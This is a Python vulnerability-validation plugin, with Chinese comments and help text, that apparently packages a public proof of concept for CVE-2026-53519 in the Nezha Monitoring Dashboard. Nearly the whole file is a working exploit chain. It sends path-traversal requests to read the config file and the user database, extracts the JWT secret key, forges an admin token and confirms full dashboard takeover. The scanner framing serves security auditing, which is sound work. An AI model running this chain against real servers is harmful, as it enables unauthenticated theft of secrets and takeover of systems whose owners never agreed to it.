#!/usr/bin/env python3
"""CVE-2026-53519 – Nezha Monitoring Dashboard: Unauthenticated Path Traversal + JWT Secret Leak → Admin Takeover.

Public PoC source: https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-53519%20Nezha%20Monitoring
  Files: ['exploit/CVE-2026-53519.py']
  Original upstream PoC: https://github.com/tar-xz/CVE-2026-53519-PoC
  Technique:
    1. GET /dashboard../data/config.yaml  →  path traversal bypasses /dashboard prefix check
       (Go's HasPrefix("/dashboard") + TrimPrefix("/dashboard") = "../data/..."),
       returns config with jwt_secret_key.
    2. GET /dashboard../data/sqlite.db   →  download user database, extract admin user_id.
    3. Forge HS256 JWT: header.payload.HMAC(secret, header+"."+payload).
    4. Use forged JWT to access /api/v1/profile as admin → full dashboard takeover.
  CVSS 3.1: 9.1 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N).
  Fixed: Nezha Monitoring >= 2.0.13.

Reference: https://github.com/nezhahq/nezha/security/advisories/GHSA-5c25-7vpj-9mqh
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import sqlite3
import tempfile
import time
import urllib.error
import urllib.request

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 66,
    "cve": "CVE-2026-53519",
    "year": 2026,
    "domain": "network",
    "vendor_product": "Nezha Monitoring < 2.0.13",
    "component": "fallbackToFrontend – HasPrefix('/dashboard') prefix check vs path traversal",
    "type": "未授权路径遍历 + JWT 密钥泄露 → 管理员接管",
    "summary": (
        "CVE-2026-53519: 哪吒监控 Dashboard < 2.0.13 fallbackToFrontend 函数对 "
        "/dashboard 进行字符串前缀匹配而非路径段匹配。"
        "攻击者发送 /dashboard../data/config.yaml 可绕过检查读取配置文件，"
        "获取 jwt_secret_key 后伪造管理员 HS256 JWT，实现控制台接管。"
        "无需认证，无需用户交互，CVSS 9.1 CRITICAL。"
    ),
    "source_url": "https://github.com/nezhahq/nezha/security/advisories/GHSA-5c25-7vpj-9mqh",
    "requires_manual_review": False,
    "affected": [
        {"vendor": "Nezha", "product": "nezha",
         "versions": [{"version": "0", "status": "affected", "lessThan": "2.0.13"}]},
    ],
}

TRAVERSAL_PATHS = [
    "/dashboard../data/config.yaml",
    "/dashboard%2e%2e/data/config.yaml",
    "/dashboard..%2fdata/config.yaml",
]
DB_TRAVERSAL_PATHS = [
    "/dashboard../data/sqlite.db",
    "/dashboard%2e%2e/data/sqlite.db",
]


def _url_fetch(url: str, timeout: int = 10) -> bytes | None:
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read()
    except urllib.error.HTTPError as e:
        if e.code == 404:
            return None
        raise
    except Exception:
        return None


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _forge_jwt(secret: str, user_id: int) -> str:
    now = int(time.time())
    header = _b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    payload = _b64url_encode(json.dumps({
        "user_id": user_id,
        "ip": "",
        "exp": now + 3600,
        "orig_iat": now,
    }).encode())
    signing_input = f"{header}.{payload}"
    sig = _b64url_encode(
        hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    )
    return f"{signing_input}.{sig}"


def _verify_admin_token(base_url: str, token: str, timeout: int = 8) -> dict:
    try:
        req = urllib.request.Request(
            f"{base_url}/api/v1/profile",
            headers={"Authorization": f"Bearer {token}", "User-Agent": "Mozilla/5.0"},
        )
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read()
            return {"status": r.status, "body": body[:300].decode(errors="replace"), "success": r.status == 200}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "body": str(e), "success": False}
    except Exception as exc:
        return {"status": None, "body": str(exc), "success": False}


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 8008))
    scheme = params.get("scheme", "http")
    base_url = f"{scheme}://{target_ip}:{port}"

    evidence: dict = {
        "cve": "CVE-2026-53519",
        "target": base_url,
        "technique": (
            "GET /dashboard../data/config.yaml bypasses HasPrefix('/dashboard') check. "
            "Go's TrimPrefix removes '/dashboard', leaving '../data/config.yaml'. "
            "path.Join('admin-dist', '../data/config.yaml') → 'data/config.yaml'. "
            "jwt_secret_key extracted → HS256 JWT forged → admin takeover."
        ),
        "reference": "https://github.com/nezhahq/nezha/security/advisories/GHSA-5c25-7vpj-9mqh",
        "poc_source": "https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-53519%20Nezha%20Monitoring",
        "exploit_files": ["exploit/CVE-2026-53519.py"],
        "affected_versions": "Nezha Monitoring < 2.0.13",
        "fixed_versions": "2.0.13+",
    }

    # Step 1: Path traversal to read config.yaml
    config_data: bytes | None = None
    for path in TRAVERSAL_PATHS:
        data = _url_fetch(f"{base_url}{path}")
        if data and (b"jwt_secret_key" in data or b"agent_secret_key" in data):
            config_data = data
            evidence["traversal_path_used"] = path
            evidence["config_fetched"] = True
            evidence["config_size"] = len(data)
            break

    if not config_data:
        evidence["traversal_result"] = "Path traversal did not yield config.yaml with jwt_secret_key."
        evidence["detail"] = (
            "Service may be absent, patched (≥2.0.13), or using a non-default config path. "
            "Check that target is Nezha Monitoring Dashboard (default port 8008)."
        )
        return {"vulnerable": False, "evidence": evidence}

    # Extract jwt_secret_key
    m = re.search(rb'jwt_secret_key:\s*["\']?([^\s"\']+)["\']?', config_data)
    if not m:
        evidence["detail"] = "config.yaml readable but jwt_secret_key not found."
        return {"vulnerable": True, "evidence": evidence}  # traversal succeeded = vulnerable

    jwt_secret = m.group(1).decode(errors="replace")
    evidence["jwt_secret_leaked"] = True
    evidence["jwt_secret_preview"] = jwt_secret[:8] + "..."

    # Step 2: Fetch sqlite.db to get admin user_id
    admin_id: int = 1  # default fallback
    for path in DB_TRAVERSAL_PATHS:
        db_data = _url_fetch(f"{base_url}{path}")
        if db_data and len(db_data) > 100:
            try:
                with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
                    f.write(db_data)
                    db_path = f.name
                conn = sqlite3.connect(db_path)
                row = conn.execute("SELECT id FROM users WHERE role='admin' OR role=1 LIMIT 1").fetchone()
                if row:
                    admin_id = row[0]
                conn.close()
                evidence["sqlite_db_fetched"] = True
                evidence["admin_user_id"] = admin_id
            except Exception as exc:
                evidence["sqlite_parse_error"] = str(exc)
            break

    # Step 3: Forge JWT
    token = _forge_jwt(jwt_secret, admin_id)
    evidence["jwt_forged"] = True
    evidence["forged_token_preview"] = token[:40] + "..."

    # Step 4: Verify admin access
    verify = _verify_admin_token(base_url, token)
    evidence["admin_api_response_status"] = verify.get("status")
    evidence["admin_api_body_preview"] = verify.get("body", "")[:200]

    if verify.get("success"):
        evidence["detail"] = (
            "FULL ADMIN TAKEOVER: path traversal leaked jwt_secret_key, "
            "forged JWT accepted by /api/v1/profile."
        )
        return {"vulnerable": True, "evidence": evidence}
    else:
        evidence["detail"] = (
            "Path traversal and jwt_secret_key leak confirmed (VULNERABLE), "
            f"but JWT verification returned {verify.get('status')} (may need correct user_id)."
        )
        return {"vulnerable": True, "evidence": evidence}


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class NezhaPathTraversalJWTAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "poc_lab_vehicle"
    meta_display_id = "POC-NET-066"
    meta_poc_name = 'CVE-2026-53519 Nezha Dashboard Path Traversal JWT Forgery Active Validation'
    meta_cve_id = "CVE-2026-53519"
    meta_severity = "Critical"
    meta_protocol = "http"
    meta_target_os = ["linux"]
    meta_required_params = []
    meta_optional_params = ["port", "scheme"]
    meta_profiles = ["network", "traversal", "jwt", "web"]
    meta_source_url = "https://github.com/nezhahq/nezha/security/advisories/GHSA-5c25-7vpj-9mqh"
    meta_references       = ['https://github.com/nezhahq/nezha/security/advisories/GHSA-5c25-7vpj-9mqh']
    meta_attack_surface = "Nezha Monitoring Dashboard HTTP – 无需认证 – 路径遍历泄露 JWT 密钥 → 管理员接管"
    is_disruptive = False
    meta_destructive_level = "InfoLeakAndPrivEsc"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "66_Nezha_Dashboard_Path_Traversal_JWT_Audit") if "VULN" in dir() else "66_Nezha_Dashboard_Path_Traversal_JWT_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = NezhaPathTraversalJWTAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
